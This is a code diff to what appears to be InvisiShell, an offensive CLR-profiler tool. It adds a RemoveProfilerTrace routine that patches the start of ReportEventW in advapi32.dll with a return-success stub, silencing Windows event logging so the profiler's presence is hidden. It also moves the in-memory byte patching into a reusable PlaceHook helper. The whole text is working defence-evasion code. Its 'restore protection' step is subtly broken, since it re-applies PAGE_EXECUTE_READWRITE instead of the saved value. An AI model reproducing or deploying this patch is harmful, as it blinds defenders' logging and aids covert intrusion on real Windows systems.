@@ -80,6 +80,29 @@ InvisiShellProfiler::~InvisiShellProfiler()
 }
 
 
+
+void InvisiShellProfiler::RemoveProfilerTrace()
+{
+	HMODULE hAdvapi32 = NULL;
+	PVOID pReportEventW = NULL;
+
+	hAdvapi32 = GetModuleHandleW(L"advapi32.dll");
+	if (NULL == hAdvapi32)
+		goto Leave;
+
+	pReportEventW = GetProcAddress(hAdvapi32, "ReportEventW");
+	if (NULL == pReportEventW)
+		goto Leave;
+	
+	if (FALSE == InvisiShellProfiler::PlaceHook(pReportEventW, "\x33\xC0\x0C\x01\xC3", 5))
+		goto Leave;
+
+Leave:
+	return;
+}
+
+
+
 DWORD InvisiShellProfiler::DetachProfilerThread(ICorProfilerInfo3* InvisiShellProfilerInfo)
 {
 	DWORD hr = E_FAIL;
@@ -238,6 +261,33 @@ Leave:
 	return retVal;
 }
 
+bool InvisiShellProfiler::PlaceHook(void* lpFunction, void* pHookBuffer, size_t nHookBufferSize)
+{
+	bool retVal = false;
+	// No need to actually place hook, we can just overwrite the bytes with RET opcode
+	DWORD dwOldProtection = 0;
+	// Get write permissions on the memory area
+	if (FALSE == VirtualProtect((LPVOID)lpFunction, nHookBufferSize, PAGE_EXECUTE_READWRITE, &dwOldProtection))
+	{
+		MyDebugPrintA("Failed modifying hooked function memory protection at %p, size %x\n", lpFunction, (DWORD)nHookBufferSize);
+		goto Leave;
+	}
+	memcpy((void*)lpFunction, pHookBuffer, nHookBufferSize);
+	// Hook is in place, further code is courtesy cleanup
+	// If memory protection was modified, restore it to original state
+	if (PAGE_EXECUTE_READWRITE != dwOldProtection &&
+		(FALSE == VirtualProtect((LPVOID)lpFunction, nHookBufferSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)))
+	{
+		MyDebugPrintA("Failed restorig previous memory protection\n");
+	}
+
+	retVal = true;
+Leave:
+	return retVal;
+
+}
+
+
 
 
 bool InvisiShellProfiler::FindAndPlaceHooks(
@@ -257,23 +307,7 @@ bool InvisiShellProfiler::FindAndPlaceHooks(
 		goto Leave;
 	MyDebugPrintA("%S.%S (original) found\n", szClass, szFunction);
 
-	// No need to actually place hook, we can just overwrite the bytes with RET opcode
-	DWORD dwOldProtection = 0;
-	// Get write permissions on the memory area
-	if (FALSE == VirtualProtect((LPVOID)lpFunction, nHookBufferSize, PAGE_EXECUTE_READWRITE, &dwOldProtection))
-	{
-		MyDebugPrintA("Failed modifying hooked function memory protection at %p, size %x\n", lpFunction, (DWORD)nHookBufferSize);
-		goto Leave;
-	}
-	memcpy((void*)lpFunction, pHookBuffer, nHookBufferSize);
-	// Hook is in place, further code is courtesy cleanup
-	bRetVal = true;
-	// If memory protection was modified, restore it to original state
-	if (PAGE_EXECUTE_READWRITE != dwOldProtection &&
-		(FALSE == VirtualProtect((LPVOID)lpFunction, nHookBufferSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)))
-	{
-		MyDebugPrintA("Failed restorig previous memory protection\n");
-	}
+	bRetVal = PlaceHook((void*)lpFunction, pHookBuffer, nHookBufferSize);
 
 Leave:
 	if (bRetVal)
@@ -349,6 +383,8 @@ HRESULT STDMETHODCALLTYPE InvisiShellProfiler::Initialize(IUnknown *pICorProfile
 
 
 	HRESULT hr = this->InvisiShellProfilerInfo->SetEventMask(eventMask);
+
+	this->RemoveProfilerTrace();
 
 	return S_OK;
 }
